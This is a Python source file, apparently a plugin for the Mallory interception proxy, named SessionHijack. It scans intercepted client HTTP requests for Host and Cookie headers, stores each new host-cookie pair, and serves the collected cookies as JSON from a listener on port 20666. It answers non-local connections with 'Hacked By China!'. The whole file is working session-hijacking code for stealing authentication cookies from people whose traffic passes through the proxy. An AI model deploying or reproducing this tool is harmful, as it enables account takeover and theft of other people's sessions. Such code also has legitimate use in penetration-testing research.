import socket
import config
import logging
from base import Base

import json

class SessionHijack (Base):
    def __init__(self, rules = [], config = config.Config()):
        Base.__init__(self)
        self.persistent = 1
        self.sessions = []
        self.log = logging.getLogger("mallorymain")

    def do (self, **kwargs):
        #Check to see if this came of the dameon we expected
        if kwargs['event'] == "HTTP:c2s":
            #Look to see if we know where in the process it came and use properly
            self.do_c2s(kwargs['data'])
        return kwargs

    def do_c2s(self, request):
        headers = str(request.headers)
        #Only look for host and cookie headers...
        #Alot of others ways to maintin sessoin.. ill worry aobut that one later
        #ie. auth random header
        if headers.find("Host") > -1 and headers.find("Cookie") > -1:
            headers = headers.split('\n')
            for header in headers:
                if header.find ("Host") > -1:
                    host = header.strip()
                if header.find ("Cookie") > -1:
                    cookie = header.strip()
                    if (host,cookie) in self.sessions:
                        pass
                    else:
                        self.log.debug("SessionHijack: Adding new cookie %s" % (cookie))
                        self.sessions.append((host, cookie))
    
    def runp (self):
        host = ''
        port = 20666
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host,port))
        server.listen(1)
        while True:
            client, addr = server.accept ()
            if addr[0] != "127.0.0.1":
                client.send("Hacked By China!")
                client.close()
                continue
            request = client.recv(8192)
            request = request.split('\n')
            path = request[0].split()[1]
            client.send("HTTP/1.0 200 OK\r\n")
            client.send("Content-Type: text/html\r\n\r\n")
            if path == "/":
                client.send(json.dumps(self.sessions))
            client.close()
